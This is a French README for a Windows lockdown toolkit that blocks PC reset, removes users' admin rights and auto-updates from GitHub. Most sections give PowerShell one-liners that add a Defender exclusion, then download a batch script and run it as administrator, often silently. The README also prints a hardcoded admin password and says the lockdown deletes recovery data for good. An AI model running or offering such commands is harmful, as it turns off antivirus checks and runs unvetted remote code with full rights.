# NoWin v4.2 - System Lockdown Suite

📖 [Documentation complète](DOCS.md) | 🔑 **Mot de passe admin:** `uyy`

---

## 🌟 MENU INTELLIGENT (Smart Manager) - _NOUVEAU_

C'est la méthode recommandée. Lance un menu interactif qui permet de lancer tous les outils depuis une seule interface (télécharge automatiquement les autres scripts si besoin).

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/NoWin.bat" -OutFile "$p\NoWin.bat"; Start-Process "$p\NoWin.bat" -Verb RunAs
```

NoWin.bat est maintenant l'orchestrateur central :

- Il pilote tous les scripts depuis le menu.
- Il supporte les commandes directes (sans interface).
- Avec `--yes`, il valide automatiquement les confirmations des scripts compatibles.
- En mode `--yes`, il lance aussi un pre-check AutoUpdate avant l'action (sauf `--skip-update`).

Exemples de commandes directes via NoWin.bat :

```powershell
# Lockdown silencieux via orchestrateur
Start-Process "$env:USERPROFILE\Downloads\NoWin\NoWin.bat" -ArgumentList "lockdown --yes" -Verb RunAs -Wait

# Verify silencieux
Start-Process "$env:USERPROFILE\Downloads\NoWin\NoWin.bat" -ArgumentList "verify --yes" -Verb RunAs -Wait

# AutoUpdate check / update / install scheduler
Start-Process "$env:USERPROFILE\Downloads\NoWin\NoWin.bat" -ArgumentList "autoupdate-check" -Verb RunAs -Wait
Start-Process "$env:USERPROFILE\Downloads\NoWin\NoWin.bat" -ArgumentList "autoupdate-update --yes" -Verb RunAs -Wait
Start-Process "$env:USERPROFILE\Downloads\NoWin\NoWin.bat" -ArgumentList "autoupdate-install" -Verb RunAs -Wait
```

## 🔄 AUTO UPDATE GITHUB (Nouveau)

Permet de verifier/appliquer les mises a jour depuis le depot GitHub, avec mode manuel et mode automatique (tache planifiee SYSTEM).
Le moteur detecte l'etat distant via l'API GitHub (`pushed_at`) et met a jour uniquement les fichiers presents dans le depot.

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/AutoUpdate.bat" -OutFile "$p\AutoUpdate.bat"; Start-Process "$p\AutoUpdate.bat" -Verb RunAs
```

Exemples en commande directe (sans interface menu NoWin):

```powershell
# Verifier si une nouvelle version existe
Start-Process "$env:USERPROFILE\Downloads\NoWin\AutoUpdate.bat" -ArgumentList "--check" -Verb RunAs -Wait

# Mettre a jour immediatement
Start-Process "$env:USERPROFILE\Downloads\NoWin\AutoUpdate.bat" -ArgumentList "--update" -Verb RunAs -Wait

# Installer l'auto-update quotidien (03:30, compte SYSTEM)
Start-Process "$env:USERPROFILE\Downloads\NoWin\AutoUpdate.bat" -ArgumentList "--install" -Verb RunAs -Wait
```

---

## 🔒 Commandes Directes (Fonctionnement silencieux ou autonome)

Si vous voulez lancer une action spécifique directement (sans passer par le menu), vous pouvez toujours utiliser ces commandes autonomes :

### 🔒 Lockdown - Bloquer réinitialisation PC

```powershell
# Avec confirmation
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Lockdown.bat" -OutFile "$p\Lockdown.bat"; Start-Process "$p\Lockdown.bat" -Verb RunAs
```

```powershell
# Mode silencieux (--yes)
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Lockdown.bat" -OutFile "$p\Lockdown.bat"; Start-Process "$p\Lockdown.bat" -ArgumentList "--yes" -Verb RunAs
```

## 🔓 Unlock - Restaurer système

⚠️ **Important** : Unlock ne peut PAS restaurer `winre.wim` automatiquement. Vous devez le copier depuis un média d'installation Windows.

```powershell
# Avec confirmation
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Unlock.bat" -OutFile "$p\Unlock.bat"; Start-Process "$p\Unlock.bat" -Verb RunAs
```

```powershell
# Mode silencieux (--yes)
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Unlock.bat" -OutFile "$p\Unlock.bat"; Start-Process "$p\Unlock.bat" -ArgumentList "--yes" -Verb RunAs
```

## ✅ Verify - Vérifier état système

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Verify.bat" -OutFile "$p\Verify.bat"; Start-Process "$p\Verify.bat" -ArgumentList "--yes" -Verb RunAs
```

## 👤 UserLock - Restreindre utilisateur

```powershell
# Avec confirmation
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserLock.bat" -OutFile "$p\UserLock.bat"; Start-Process "$p\UserLock.bat" -Verb RunAs
```

```powershell
# Mode silencieux (--yes)
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserLock.bat" -OutFile "$p\UserLock.bat"; Start-Process "$p\UserLock.bat" -ArgumentList "--yes" -Verb RunAs
```

## 👤 UserUnlock - Restaurer droits administrateur

```powershell
# Avec confirmation
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserUnlock.bat" -OutFile "$p\UserUnlock.bat"; Start-Process "$p\UserUnlock.bat" -Verb RunAs
```

```powershell
# Mode silencieux (--yes)
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UserUnlock.bat" -OutFile "$p\UserUnlock.bat"; Start-Process "$p\UserUnlock.bat" -ArgumentList "--yes" -Verb RunAs
```

## 🔄 Force Update Agent

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat" -OutFile "$p\force-update-agent.bat"; Start-Process "$p\force-update-agent.bat" -ArgumentList "--yes" -Verb RunAs
```

## 🛡️ Watchdog - Auto-remediation

Le Watchdog surveille les verrous critiques et les remet en place automatiquement si modifies.

```powershell
$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/Watchdog.bat" -OutFile "$p\Watchdog.bat"; Start-Process "$p\Watchdog.bat" -Verb RunAs
```

---

## ⚙️ Guide d'utilisation

**🔒 Pour BLOQUER le système :**

- **Lockdown** = Bloquer réinitialisation PC
- **UserLock** = Retirer droits admin d'un utilisateur

**🔓 Pour DÉBLOQUER le système :**

- **Unlock** = Restaurer réinitialisation PC
- **UserUnlock** = Redonner droits admin

**💡 Ordre pour réappliquer après modifications :**

1. D'abord débloquer : `Unlock` puis `UserUnlock`
2. Ensuite rebloquer : `Lockdown` puis `UserLock`

**⚠️ Restauration WinRE après Unlock :**

1. Lockdown supprime `winre.wim` définitivement
2. Unlock ne peut PAS le restaurer automatiquement
3. Vous devez copier `winre.wim` depuis un média d'installation Windows
4. Voir instructions détaillées dans [DOCS.md](DOCS.md)

**Accès admin :**

- Utilisez le raccourci "Lanceur Admin" (créé par UserLock)
- Ou tapez `runas /user:Administrator cmd` (mdp: `uyy`)
